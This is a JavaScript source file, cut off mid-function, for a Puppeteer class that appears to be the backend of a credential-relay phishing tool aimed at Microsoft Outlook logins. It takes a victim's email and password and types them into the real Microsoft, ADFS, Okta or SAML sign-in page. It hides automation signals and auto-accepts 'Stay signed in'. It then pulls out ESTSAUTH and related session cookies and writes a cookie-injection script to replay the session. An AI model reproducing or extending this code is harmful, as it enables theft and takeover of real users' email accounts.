const puppeteer = require('puppeteer');
const crypto = require('crypto');
const fs = require('fs');

class ClosedBridgeAutomation {
    constructor(options = {}) {
        this.browser = null;
        this.page = null;
        this.context = null;
        this.enableScreenshots = options.enableScreenshots !== false;
        this.screenshotQuality = options.screenshotQuality || 80;
        this.isClosing = false;
        this.lastActivity = Date.now();
        this.loginProvider = null;   // Cache detected login provider
        this.sessionId = options.sessionId || null; // Store session ID for event broadcasting
        this.eventCallback = options.eventCallback || null; // Callback for broadcasting events
        
        // Use shared encryption utilities
        this.encryptionUtils = require('./encryption-utils');
    }

    findChromiumExecutable() {
        // Check environment variable first (allows manual override)
        if (process.env.CHROMIUM_PATH) {
            if (fs.existsSync(process.env.CHROMIUM_PATH)) {
                return process.env.CHROMIUM_PATH;
            } else {
                console.warn(`⚠️ CHROMIUM_PATH is set but not found: ${process.env.CHROMIUM_PATH}`);
            }
        }

        // Common paths for different systems (Ubuntu/Debian, macOS, Windows)
        const possiblePaths = [
            '/usr/bin/chromium-browser',
            '/usr/bin/chromium',
            '/usr/bin/google-chrome',
            '/usr/bin/google-chrome-stable',
            '/snap/bin/chromium',
            '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
            'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'
        ];

        for (const path of possiblePaths) {
            if (fs.existsSync(path)) {
                return path;
            }
        }

        // For Replit Nix environments, try to find chromium dynamically
        if (fs.existsSync('/nix/store')) {
            try {
                const { execSync } = require('child_process');
                const nixChromium = execSync('which chromium-browser 2>/dev/null || echo ""', { encoding: 'utf8' }).trim();
                if (nixChromium && fs.existsSync(nixChromium)) {
                    return nixChromium;
                }
            } catch (error) {
                // Ignore errors, will fall through to Puppeteer auto-detect
            }
        }

        // Return null to let Puppeteer auto-detect (uses bundled Chromium)
        return null;
    }


    // Use shared encryption utilities
    encrypt(text) {
        return this.encryptionUtils.encryptData(text);
    }

    decrypt(encryptedText) {
        return this.encryptionUtils.decryptData(encryptedText);
    }

    async init() {
        // Randomized browser arguments for fingerprinting resistance
        const baseArgs = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-first-run',
            '--disable-extensions',
            '--disable-infobars',
            '--disable-notifications',
            '--disable-default-apps',
            '--disable-background-networking',
            '--disable-sync',
            '--no-default-browser-check',
            '--disable-popup-blocking',
            '--disable-translate',
            '--memory-pressure-off',
            '--max_old_space_size=512',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding',
            '--disable-software-rasterizer',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process'
            // REMOVED: --single-process and --no-zygote (causes crashes with browser contexts in Replit)
        ];

        // Add randomized stealth args
        const stealthArgs = [
            '--disable-blink-features=AutomationControlled',
            '--disable-features=VizDisplayCompositor',
            '--disable-ipc-flooding-protection',
            `--user-data-dir=/tmp/chrome_${Math.random().toString(36).substring(2, 15)}`,
            `--window-size=${1280 + Math.floor(Math.random() * 200)},${720 + Math.floor(Math.random() * 200)}`
        ];

        const allArgs = [...baseArgs, ...stealthArgs];

        const chromiumPath = this.findChromiumExecutable();
        if (chromiumPath) {
            console.log('Using system Chromium:', chromiumPath);
        } else {
            console.log('Using Puppeteer auto-detected Chromium');
        }
        console.log('Launching browser...');

        const launchOptions = {
            headless: true,
            args: allArgs,
            slowMo: 10 + Math.floor(Math.random() * 20),
            devtools: false,
            ignoreDefaultArgs: ['--enable-automation']
            
        };

        if (chromiumPath) {
            launchOptions.executablePath = chromiumPath;
        }

        try {
            this.browser = await puppeteer.launch(launchOptions);
            console.log('Browser launched successfully');
        } catch (launchError) {
            console.error('❌ Failed to launch browser:', launchError.message);
            throw new Error(`Browser launch failed: ${launchError.message}`);
        }

        // Create INCOGNITO browser context for true private browsing
        try {
            // Use createBrowserContext() instead of deprecated createIncognitoBrowserContext()
            this.context = await this.browser.createBrowserContext();
            console.log('✅ Created INCOGNITO browser context (private browsing mode)');
        } catch (contextError) {
            console.error('❌ Failed to create incognito browser context:', contextError.message);
            await this.browser.close().catch(() => {});
            throw new Error(`Incognito browser context creation failed: ${contextError.message}`);
        }

        // Create new page in INCOGNITO context - MUST use incognito for privacy
        try {
            console.log('Creating new page in INCOGNITO context...');
            this.page = await this.context.newPage();
            console.log('✅ New page created in INCOGNITO context successfully');
        } catch (pageError) {
            console.error('❌ Failed to create page in incognito context:', pageError.message);
            // DO NOT fallback to non-incognito browser - privacy is mandatory
            await this.browser.close().catch(() => {});
            throw new Error(`Incognito page creation failed: ${pageError.message}. Browser MUST remain in incognito mode.`);
        }

        // Add stealth measures
        await this.page.evaluateOnNewDocument(() => {
            // Remove webdriver property
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });

            // Mock permissions
            const originalQuery = window.navigator.permissions.query;
            return window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );
        });

        // Set user agent
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        ];
        await this.page.setUserAgent(userAgents[Math.floor(Math.random() * userAgents.length)]);

        // Set viewport with slight randomization
        await this.page.setViewport({
            width: 1280 + Math.floor(Math.random() * 200),
            height: 720 + Math.floor(Math.random() * 200)
        });

        // Set extra headers
        await this.page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        });

        console.log('Browser initialized successfully');
        this.lastActivity = Date.now();
    }

    async navigateToOutlook() {
        if (!this.page) {
            throw new Error('Browser not initialized. Call init() first.');
        }

        try {
            console.log('Navigating to Outlook...');
            
            // Check if page is still attached before navigation
            if (this.page.isClosed()) {
                throw new Error('Page is already closed before navigation');
            }
            
            // Navigate directly to Microsoft login page to avoid redirects
            await this.page.goto('https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&response_type=id_token&scope=openid%20profile&redirect_uri=https://outlook.office.com/owa/', {
                waitUntil: 'load',
                timeout: 60000
            });

            // Check if page is still attached after navigation
            if (this.page.isClosed()) {
                throw new Error('Page was closed during navigation');
            }

            console.log('Successfully navigated to Outlook');
            this.lastActivity = Date.now();
            return true;
            
        } catch (error) {
            console.error('❌ Navigation to Outlook failed:', error.message);
            
            // Provide more specific error information
            if (error.message.includes('frame was detached') || 
                error.message.includes('Target closed') ||
                error.message.includes('Session closed')) {
                throw new Error(`Browser frame detached during navigation: ${error.message}`);
            }
            
            throw error;
        }
    }

    async enterEmail(email) {
        if (!this.page) {
            throw new Error('Browser not initialized. Call init() first.');
        }

        console.log(`📧 Entering email: ${email}`);
        
        try {
            // Working Microsoft email input selectors
            const emailSelectors = [
                'input[name="loginfmt"]', // Primary Microsoft selector
                '#i0116', // Microsoft signin page
                'input[type="email"]'
            ];
            
            let emailInput = null;
            
            // First try to find existing fields immediately (no waiting)
            for (const selector of emailSelectors) {
                emailInput = await this.page.$(selector);
                if (emailInput) {
                    console.log(`⚡ Found email input immediately with selector: ${selector}`);
                    break;
                }
            }
            
            // If not found immediately, try waiting for each selector with longer timeout
            if (!emailInput) {
                console.log('⏳ Email field not immediately visible, waiting...');
                for (const selector of emailSelectors) {
                    try {
                        await this.page.waitForSelector(selector, { timeout: 5000 });
                        emailInput = await this.page.$(selector);
                        if (emailInput) {
                            console.log(`🎯 Found email input after wait with selector: ${selector}`);
                            break;
                        }
                    } catch (e) {
                        // Continue to next selector
                        continue;
                    }
                }
            }
            
            if (!emailInput) {
                throw new Error('Could not find email input field');
            }

            // Use page.evaluate to enter email more reliably, avoiding navigation issues
            await this.page.evaluate((selector, emailValue) => {
                const input = document.querySelector(selector);
                if (input) {
                    input.value = emailValue;
                    // Trigger input event to ensure Microsoft's JS detects the change
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    input.dispatchEvent(new Event('change', { bubbles: true }));
                }
            }, emailSelectors[0], email);
            
            console.log('✅ Email entered successfully');
            this.preloadedEmail = email;
            this.isPreloaded = true;
            this.lastActivity = Date.now();
            
            return true;
            
        } catch (error) {
            console.error('❌ Email entry failed:', error.message);
            
            // If this is a navigation/context error, it might be recoverable
            if (error.message.includes('Execution context was destroyed') || 
                error.message.includes('navigation')) {
                console.log('⚠️ Navigation detected during email entry, retrying...');
                // Wait a bit for navigation to complete
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Retry once
                try {
                    const retryInput = await this.page.waitForSelector('input[name="loginfmt"], #i0116, input[type="email"]', { timeout: 5000 });
                    if (retryInput) {
                        await this.page.evaluate((emailValue) => {
                            const input = document.querySelector('input[name="loginfmt"]') || 
                                         document.querySelector('#i0116') || 
                                         document.querySelector('input[type="email"]');
                            if (input) {
                                input.value = emailValue;
                                input.dispatchEvent(new Event('input', { bubbles: true }));
                                input.dispatchEvent(new Event('change', { bubbles: true }));
                            }
                        }, email);
                        console.log('✅ Email entered successfully on retry');
                        return true;
                    }
                } catch (retryError) {
                    console.error('❌ Retry also failed:', retryError.message);
                }
            }
            
            throw error;
        }
    }

    async clickNext() {
        if (!this.page) {
            throw new Error('Browser not initialized. Call init() first.');
        }

        console.log('🔄 Clicking Next button...');
        
        try {
            // Working Microsoft Next button selectors
            const nextSelectors = [
                '#idSIButton9', // Primary Microsoft next button
                'input[type="submit"]',
                'input[value="Next"]'
            ];
            
            let nextButton = null;
            
            // First try to find button immediately (no waiting)
            for (const selector of nextSelectors) {
                nextButton = await this.page.$(selector);
                if (nextButton) {
                    console.log(`⚡ Found Next button immediately with selector: ${selector}`);
                    break;
                }
            }
            
            // If not found immediately, try waiting for each selector
            if (!nextButton) {
                console.log('⏳ Next button not immediately visible, waiting...');
                for (const selector of nextSelectors) {
                    try {
                        await this.page.waitForSelector(selector, { timeout: 3000 });
                        nextButton = await this.page.$(selector);
                        if (nextButton) {
                            console.log(`🎯 Found Next button after wait with selector: ${selector}`);
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
            }
            
            if (!nextButton) {
                throw new Error('Could not find Next button with any selector');
            }

            // Use Promise.race to handle navigation during click
            await Promise.race([
                nextButton.click(),
                this.page.waitForNavigation({ timeout: 5000 }).catch(() => {})
            ]);
            console.log('✅ Next button clicked');
            
            // Wait for page transition with navigation handling
            await new Promise(resolve => setTimeout(resolve, 3000));
            this.lastActivity = Date.now();
            return true;
            
        } catch (error) {
            console.error('❌ Next button click failed:', error.message);
            throw error;
        }
    }

    async detectLoginProvider() {
        if (!this.page) {
            throw new Error('Browser not initialized. Call init() first.');
        }

        console.log('🔍 Detecting login provider...');
        
        try {
            const url = this.page.url();
            const pageContent = await this.page.content();
            
            // Check URL patterns
            if (url.includes('login.microsoftonline.com')) {
                this.loginProvider = 'Microsoft';
            } else if (url.includes('adfs') || pageContent.includes('ADFS')) {
                this.loginProvider = 'ADFS';
            } else if (url.includes('okta') || pageContent.includes('Okta')) {
                this.loginProvider = 'Okta';
            } else if (url.includes('saml') || pageContent.includes('SAML')) {
                this.loginProvider = 'SAML';
            } else if (url.includes('outlook.office.com') || url.includes('login.live.com')) {
                this.loginProvider = 'Microsoft';
            } else {
                this.loginProvider = 'Unknown';
            }
            
            console.log(`🏢 Detected login provider: ${this.loginProvider}`);
            this.lastActivity = Date.now();
            return this.loginProvider;
        } catch (error) {
            console.warn('⚠️ Could not detect login provider:', error.message);
            this.loginProvider = 'Unknown';
            return 'Unknown';
        }
    }

    // Preload functionality removed - all browsers created fresh on-demand

    async performLogin(email, password, attemptNumber = 1) {
        if (!this.page) {
            throw new Error('Browser not initialized. Call init() first.');
        }

        console.log(`🔐 [ATTEMPT ${attemptNumber}] Performing login for: ${email}`);
        console.log(`🔐 [ATTEMPT ${attemptNumber}] Password length: ${password.length} characters`);
        
        try {
            // Step 1: Always enter email (no preloading)
            console.log(`📧 [ATTEMPT ${attemptNumber}] Entering email: ${email}`);
            await this.enterEmail(email);
            await this.clickNext();
            
            // Step 2: Detect provider after email submission
            await this.detectLoginProvider();
            console.log(`🏢 [ATTEMPT ${attemptNumber}] Detected provider: ${this.loginProvider}`);
            
            // Step 3: Handle password based on provider
            switch (this.loginProvider) {
                case 'Microsoft':
                    return await this.handleMicrosoftLogin(password, attemptNumber);
                case 'ADFS':
                    return await this.handleADFSLogin(password, attemptNumber);
                case 'Okta':
                    return await this.handleOktaLogin(password, attemptNumber);
                case 'SAML':
                    return await this.handleSAMLLogin(password, attemptNumber);
                default:
                    return await this.handleGenericLogin(password, attemptNumber);
            }
        } catch (error) {
            console.error(`❌ [ATTEMPT ${attemptNumber}] Login failed:`, error.message);
            throw error;
        }
    }

    async handleMicrosoftLogin(password, attemptNumber = 1) {
        console.log(`🔐 [ATTEMPT ${attemptNumber}] Handling Microsoft login...`);
        
        // Take screenshot before password entry
        try {
            const beforeScreenshot = await this.takeScreenshot(`before_password_attempt_${attemptNumber}`);
            console.log(`📸 [ATTEMPT ${attemptNumber}] Screenshot taken BEFORE password entry: ${beforeScreenshot}`);
        } catch (screenshotError) {
            console.warn(`⚠️ [ATTEMPT ${attemptNumber}] Failed to take screenshot before password entry:`, screenshotError.message);
        }
        
        // Log current page state
        const currentUrl = this.page.url();
        console.log(`🌐 [ATTEMPT ${attemptNumber}] Current URL: ${currentUrl}`);
        
        // Wait for password field
        console.log(`⏳ [ATTEMPT ${attemptNumber}] Waiting for password field...`);
        await this.page.waitForSelector('input[type="password"], input[name="passwd"]', {
            timeout: 30000
        });
        console.log(`✅ [ATTEMPT ${attemptNumber}] Password field found!`);

        // Find and fill password
        const passwordInput = await this.page.$('input[type="password"], input[name="passwd"]');
        if (passwordInput) {
            console.log(`📝 [ATTEMPT ${attemptNumber}] Clicking password field...`);
            await passwordInput.click();
            
            console.log(`⌨️  [ATTEMPT ${attemptNumber}] Typing password (${password.length} chars)...`);
            await this.page.keyboard.type(password, { delay: 100 + Math.random() * 100 });
            
            console.log(`✅ [ATTEMPT ${attemptNumber}] Password entered successfully`);
            
            // Take screenshot after password entry
            try {
                const afterPasswordScreenshot = await this.takeScreenshot(`after_password_entry_attempt_${attemptNumber}`);
                console.log(`📸 [ATTEMPT ${attemptNumber}] Screenshot taken AFTER password entry: ${afterPasswordScreenshot}`);
            } catch (screenshotError) {
                console.warn(`⚠️ [ATTEMPT ${attemptNumber}] Failed to take screenshot after password entry:`, screenshotError.message);
            }
            
            // Click sign in button
            console.log(`🔍 [ATTEMPT ${attemptNumber}] Looking for sign-in button...`);
            const signInButton = await this.page.$('input[type="submit"], button[type="submit"], input[value="Sign in"], #idSIButton9');
            if (signInButton) {
                console.log(`🖱️  [ATTEMPT ${attemptNumber}] Clicking sign-in button...`);
                await signInButton.click();
                console.log(`✅ [ATTEMPT ${attemptNumber}] Sign-in button clicked`);
                
                // Take screenshot after clicking sign-in
                try {
                    const afterClickScreenshot = await this.takeScreenshot(`after_signin_click_attempt_${attemptNumber}`);
                    console.log(`📸 [ATTEMPT ${attemptNumber}] Screenshot taken AFTER sign-in click: ${afterClickScreenshot}`);
                } catch (screenshotError) {
                    console.warn(`⚠️ [ATTEMPT ${attemptNumber}] Failed to take screenshot after sign-in click:`, screenshotError.message);
                }
                
                // Wait for authentication
                console.log(`⏳ [ATTEMPT ${attemptNumber}] Waiting for authentication response...`);
                const authResult = await this.waitForAuthentication();
                console.log(`🎯 [ATTEMPT ${attemptNumber}] Authentication result: ${authResult}`);
                
                // Take screenshot after authentication attempt
                try {
                    const afterAuthScreenshot = await this.takeScreenshot(`after_auth_attempt_${attemptNumber}`);
                    console.log(`📸 [ATTEMPT ${attemptNumber}] Screenshot taken AFTER authentication: ${afterAuthScreenshot}`);
                } catch (screenshotError) {
                    console.warn(`⚠️ [ATTEMPT ${attemptNumber}] Failed to take screenshot after authentication:`, screenshotError.message);
                }
                
                return authResult;
            }
        }
        
        console.error(`❌ [ATTEMPT ${attemptNumber}] Could not find password field or sign in button`);
        throw new Error('Could not find password field or sign in button');
    }

    async handleADFSLogin(password) {
        console.log('🔐 Handling ADFS login...');
        
        // Similar to Microsoft but with ADFS-specific selectors
        await this.page.waitForSelector('input[type="password"], input[name="Password"], input[id="passwordInput"]', {
            timeout: 30000
        });

        const passwordInput = await this.page.$('input[type="password"], input[name="Password"], input[id="passwordInput"]');
        if (passwordInput) {
            await passwordInput.click();
            await this.page.keyboard.type(password, { delay: 100 + Math.random() * 100 });
            
            const submitButton = await this.page.$('input[type="submit"], button[type="submit"], input[value="Sign In"], #submitButton');
            if (submitButton) {
                await submitButton.click();
                await this.waitForAuthentication();
                return true;
            }
        }
        
        throw new Error('Could not complete ADFS login');
    }

    async handleOktaLogin(password) {
        console.log('🔐 Handling Okta login...');
        
        await this.page.waitForSelector('input[type="password"], input[name="password"], input[data-se="password-field"]', {
            timeout: 30000
        });

        const passwordInput = await this.page.$('input[type="password"], input[name="password"], input[data-se="password-field"]');
        if (passwordInput) {
            await passwordInput.click();
            await this.page.keyboard.type(password, { delay: 100 + Math.random() * 100 });
            
            const signInButton = await this.page.$('input[type="submit"], button[type="submit"], input[value="Sign In"]');
            if (signInButton) {
                await signInButton.click();
                await this.waitForAuthentication();
                return true;
            }
        }
        
        throw new Error('Could not complete Okta login');
    }

    async handleSAMLLogin(password) {
        console.log('🔐 Handling SAML login...');
        
        // Generic SAML handling - similar to Microsoft
        await this.page.waitForSelector('input[type="password"]', {
            timeout: 30000
        });

        const passwordInput = await this.page.$('input[type="password"]');
        if (passwordInput) {
            await passwordInput.click();
            await this.page.keyboard.type(password, { delay: 100 + Math.random() * 100 });
            
            const submitButton = await this.page.$('input[type="submit"], button[type="submit"]');
            if (submitButton) {
                await submitButton.click();
                await this.waitForAuthentication();
                return true;
            }
        }
        
        throw new Error('Could not complete SAML login');
    }

    async handleGenericLogin(password) {
        console.log('🔐 Handling generic login...');
        
        // Fallback generic login
        await this.page.waitForSelector('input[type="password"]', {
            timeout: 30000
        });

        const passwordInput = await this.page.$('input[type="password"]');
        if (passwordInput) {
            await passwordInput.click();
            await this.page.keyboard.type(password, { delay: 100 + Math.random() * 100 });
            
            const submitButton = await this.page.$('input[type="submit"], button[type="submit"]');
            if (submitButton) {
                await submitButton.click();
                await this.waitForAuthentication();
                return true;
            }
        }
        
        throw new Error('Could not complete generic login');
    }

    async waitForAuthentication() {
        console.log('⏳ Waiting for authentication...');
        const startTime = Date.now();
        const maxWaitTime = 60000; // 60 seconds
        
        try {
            // Log current URL at start
            console.log(`🌐 Current URL at start of auth wait: ${this.page.url()}`);
            
            // Poll for success indicators instead of racing
            console.log('🔍 Polling for success indicators...');
            
            while (Date.now() - startTime < maxWaitTime) {
                const currentUrl = this.page.url();
                console.log(`🔄 Checking URL: ${currentUrl} (${Date.now() - startTime}ms elapsed)`);
                
                // Check for "Stay signed in?" prompt and click Yes
                const staySignedInSelectors = [
                    'input[type="submit"][value="Yes"]',
                    'input[id="idSIButton9"]',
                    'button:contains("Yes")',
                    '#acceptButton'
                ];
                
                for (const selector of staySignedInSelectors) {
                    try {
                        const staySignedInButton = await this.page.$(selector);
                        if (staySignedInButton) {
                            const buttonText = await this.page.evaluate(el => el.textContent || el.value, staySignedInButton);
                            if (buttonText && (buttonText.includes('Yes') || buttonText.includes('yes'))) {
                                console.log('🔘 Found "Stay signed in?" prompt, clicking Yes...');
                                await staySignedInButton.click();
                                console.log('✅ Clicked "Yes" on stay signed in prompt');
                                await new Promise(resolve => setTimeout(resolve, 2000));
                                break;
                            }
                        }
                    } catch (e) {
                        // Continue checking other selectors
                    }
                }
                
                // Check URL patterns for success
                if (currentUrl.includes('outlook.office.com/mail') || 
                    currentUrl.includes('outlook.live.com/mail') ||
                    currentUrl.includes('/owa/')) {
                    const elapsedTime = Date.now() - startTime;
                    console.log(`✅ Authentication successful - URL changed to Outlook (took ${elapsedTime}ms)`);
                    console.log(`🌐 Final URL: ${currentUrl}`);
                    
                    // Take screenshot of successful page
                    await this.takeScreenshot('auth_success_page.png');
                    
                    this.lastActivity = Date.now();
                    return true;
                }
                
                // Check for success selectors
                const successSelectors = [
                    '[data-app-name="Mail"]',
                    '.ms-Nav-compositeLink',
                    '[aria-label="Mail"]',
                    '[role="main"]'
                ];
                
                for (const selector of successSelectors) {
                    const element = await this.page.$(selector).catch(() => null);
                    if (element) {
                        const elapsedTime = Date.now() - startTime;
                        console.log(`✅ Authentication successful - found element: ${selector} (took ${elapsedTime}ms)`);
                        console.log(`🌐 Final URL: ${currentUrl}`);
                        
                        // Take screenshot of successful page
                        await this.takeScreenshot('auth_success_page.png');
                        
                        this.lastActivity = Date.now();
                        return true;
                    }
                }
                
                // Check for error messages
                const errorMessages = await this.page.$$eval(
                    '[role="alert"], .alert, .error, .ms-MessageBar--error, #passwordError, .has-error', 
                    elements => elements.map(el => el.textContent.trim()).filter(text => text.length > 0)
                ).catch(() => []);
                
                if (errorMessages.length > 0) {
                    console.error(`❌ Error messages found: ${errorMessages.join(', ')}`);
                    
                    // Take screenshot of error
                    await this.takeScreenshot('auth_error_page.png');
                    
                    throw new Error(`Authentication failed: ${errorMessages.join(', ')}`);
                }
                
                // Check if password field is still visible (wrong password)
                const passwordFieldStillVisible = await this.page.$('input[type="password"]').catch(() => null);
                if (passwordFieldStillVisible && Date.now() - startTime > 5000) {
                    console.warn('⚠️ Password field still visible after 5s - likely wrong password');
                    
                    // Take screenshot showing password field still visible
                    await this.takeScreenshot('password_field_still_visible.png');
                    
                    return false;
                }
                
                // Wait 500ms before next check
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            // Timeout reached
            const elapsedTime = Date.now() - startTime;
            console.log(`⏱️  Authentication wait timeout after ${elapsedTime}ms`);
            console.log(`🌐 Current URL at timeout: ${this.page.url()}`);
            
            // Take screenshot at timeout
            await this.takeScreenshot('auth_timeout_page.png');
            
            console.warn('⚠️ Authentication timeout - no clear success or error detected');
            return false;
            
        } catch (error) {
            const elapsedTime = Date.now() - startTime;
            console.error(`❌ Authentication wait error after ${elapsedTime}ms: ${error.message}`);
            console.log(`🌐 Current URL at error: ${this.page.url()}`);
            
            // Take screenshot at error
            await this.takeScreenshot('auth_error_exception.png').catch(() => {});
            
            throw error;
        }
    }

    async validateSession(email, password) {
        if (!this.page) {
            throw new Error('Browser not initialized. Call init() first.');
        }

        console.log(`🔐 Validating session for: ${email}`);
        
        try {
            // Wait a moment for page to fully load after authentication
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Check if we're successfully authenticated by looking for success indicators
            const currentUrl = this.page.url();
            const pageContent = await this.page.content();
            
            const isAuthenticated = 
                currentUrl.includes('outlook.office.com') ||
                pageContent.includes('mail') ||
                pageContent.includes('inbox') ||
                pageContent.includes('Microsoft') ||
                await this.page.$('[data-app-name="Mail"]') !== null;
            
            if (!isAuthenticated) {
                console.log('❌ Session validation failed - not authenticated');
                return {
                    success: false,
                    message: 'Authentication failed - invalid credentials',
                    cookiesSaved: 0
                };
            }
            
            console.log('✅ Authentication successful, extracting cookies...');
            
            // Extract cookies from authenticated session
            const cookies = await this.getCookies();
            
            if (cookies.length === 0) {
                console.warn('⚠️ No authentication cookies found');
                return {
                    success: true,
                    message: 'Authentication successful but no cookies captured',
                    cookiesSaved: 0
                };
            }
            
            // Save session with cookies
            const sessionId = this.sessionId || `session_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;
            const sessionData = await this.saveSession(sessionId, email, cookies);
            
            console.log(`💾 Session validated and saved: ${sessionData.cookieCount} cookies`);
            
            this.lastActivity = Date.now();
            
            return {
                success: true,
                message: 'Session validated and cookies saved successfully',
                cookiesSaved: sessionData.cookieCount,
                sessionFile: sessionData.sessionFile,
                injectFile: sessionData.injectFile
            };
            
        } catch (error) {
            console.error('❌ Session validation failed:', error.message);
            return {
                success: false,
                message: `Session validation error: ${error.message}`,
                cookiesSaved: 0
            };
        }
    }

    async getCookies() {
        if (!this.page) {
            throw new Error('Browser not initialized. Call init() first.');
        }

        console.log('🍪 Extracting cookies...');
        
        const cookies = await this.page.cookies();
        
        // Filter for authentication-related cookies
        const authCookies = cookies.filter(cookie => {
            const sensitiveNames = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid', 'luat', 'wlidperf', 'MSPOK'];
            return sensitiveNames.some(name => cookie.name.includes(name));
        });
        
        console.log(`🍪 Found ${authCookies.length} authentication cookies`);
        this.lastActivity = Date.now();
        
        return authCookies;
    }

    // Encrypt specific cookie values
    encryptCookieValues(cookies) {
        return cookies.map(cookie => {
            // Only encrypt sensitive auth cookies
            const sensitiveNames = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid', 'luat'];
            if (sensitiveNames.includes(cookie.name)) {
                return {
                    ...cookie,
                    value: this.encrypt(cookie.value),
                    encrypted: true
                };
            }
            return cookie;
        });
    }

    async saveSession(sessionId, email, cookies) {
        const fs = require('fs');
        const path = require('path');
        
        console.log(`💾 Saving session: ${sessionId}`);
        
        // Create session_data directory if it doesn't exist
        const sessionDir = path.join(process.cwd(), 'session_data');
        if (!fs.existsSync(sessionDir)) {
            fs.mkdirSync(sessionDir, { recursive: true });
        }
        
        // Encrypt sensitive cookie values
        const encryptedCookies = this.encryptCookieValues(cookies);
        
        const sessionData = {
            sessionId,
            email: this.encrypt(email), // Encrypt email
            timestamp: new Date().toISOString(),
            provider: this.loginProvider,
            cookies: encryptedCookies,
            encrypted: true
        };
        
        // Save session data
        const sessionFile = path.join(sessionDir, `session_${sessionId}.json`);
        fs.writeFileSync(sessionFile, JSON.stringify(sessionData, null, 2));
        
        // Generate cookie injection script
        const injectScript = this.generateCookieInjectionScript(encryptedCookies, sessionId);
        const injectFile = path.join(sessionDir, `inject_session_${sessionId}.js`);
        fs.writeFileSync(injectFile, injectScript);
        
        console.log('✅ Session saved successfully');
        this.lastActivity = Date.now();
        
        return {
            sessionFile,
            injectFile,
            cookieCount: cookies.length
        };
    }

    generateCookieInjectionScript(cookies, sessionId) {
        const script = `
// Cookie injection script for session: ${sessionId}
// Generated: ${new Date().toISOString()}

(function() {
    console.log('🍪 Injecting ${cookies.length} cookies for session: ${sessionId}');
    
    const cookies = ${JSON.stringify(cookies, null, 4)};
    
    cookies.forEach(cookie => {
        let cookieString = cookie.name + '=' + cookie.value;
        
        if (cookie.domain) cookieString += '; domain=' + cookie.domain;
        if (cookie.path) cookieString += '; path=' + cookie.path;
        if (cookie.expires) cookieString += '; expires=' + new Date(cookie.expires * 1000).toUTCString();
        if (cookie.secure) cookieString += '; secure';
        if (cookie.httpOnly) cookieString += '; httponly';
        if (cookie.sameSite) cookieString += '; samesite=' + cookie.sameSite;
        
        document.cookie = cookieString;
        console.log('✅ Injected cookie:', cookie.name);
    });
    
    console.log('🎉 All cookies injected successfully');
    
    // Reload to apply cookies
    setTimeout(() => {
        console.log('🔄 Reloading to apply cookies...');
        window.location.reload();
    }, 1000);
})();
`;
        
        return script;
    }

    async takeScreenshot(filename = null) {
        if (!this.page || !this.enableScreenshots) {
            return null;
        }

        try {
            // Create ss folder if it doesn't exist
            const ssDir = 'ss';
            if (!fs.existsSync(ssDir)) {
                fs.mkdirSync(ssDir, { recursive: true });
            }
            
            // Ensure filename has .png extension
            let screenshotName = filename || `screenshot_${Date.now()}`;
            if (!screenshotName.endsWith('.png')) {
                screenshotName += '.png';
            }
            
            // Save screenshot in ss folder
            const screenshotPath = `${ssDir}/${screenshotName}`;
            
            await this.page.screenshot({
                path: screenshotPath,
                type: 'png',
                fullPage: true
            });
            
            console.log(`📸 Screenshot saved: ${screenshotPath}`);
            this.lastActivity = Date.now();
            return screenshotPath;
        } catch (error) {
            console.warn('⚠️ Screenshot failed:', error.message);
            return null;
        }
    }

    async getPageInfo() {
        if (!this.page) {
            return null;
        }

        try {
            const info = await this.page.evaluate(() => ({
                url: window.location.href,
                title: document.title,
                readyState: document.readyState,
                timestamp: new Date().toISOString()
            }));
            
            this.lastActivity = Date.now();
            return info;
        } catch (error) {
            console.warn('⚠️ Could not get page info:', error.message);
            return null;
        }
    }

    async isHealthy() {
        try {
            // Check if browser is still connected
            if (!this.browser || !this.browser.isConnected()) {
                return false;
            }
            
            // Check if page is still valid and not closed
            if (!this.page || this.page.isClosed()) {
                return false;
            }
            
            // Check if context is still valid
            if (!this.context) {
                return false;
            }
            
            // Try a simple page evaluation to ensure the page is responsive
            await this.page.evaluate(() => document.readyState);
            
            return true;
        } catch (error) {
            // If any check fails, the browser is unhealthy
            console.warn(`⚠️ Browser health check failed: ${error.message}`);
            return false;
        }
    }

    // Navigate to Outlook inbox
    async navigateToInbox() {
        if (!this.page) {
            throw new Error('Browser page not available');
        }

        try {
            console.log('📥 Navigating to Outlook inbox...');
            
            // First check current URL to determine if we're on office.com or live.com
            const currentUrl = await this.page.url();
            let inboxUrl;
            
            if (currentUrl.includes('outlook.office.com') || currentUrl.includes('office.com')) {
                // Use enterprise/business Outlook URL
                inboxUrl = 'https://outlook.office.com/mail/inbox';
                console.log('🏢 Using enterprise Outlook URL');
            } else {
                // Use consumer Outlook URL as fallback
                inboxUrl = 'https://outlook.live.com/mail/0/';
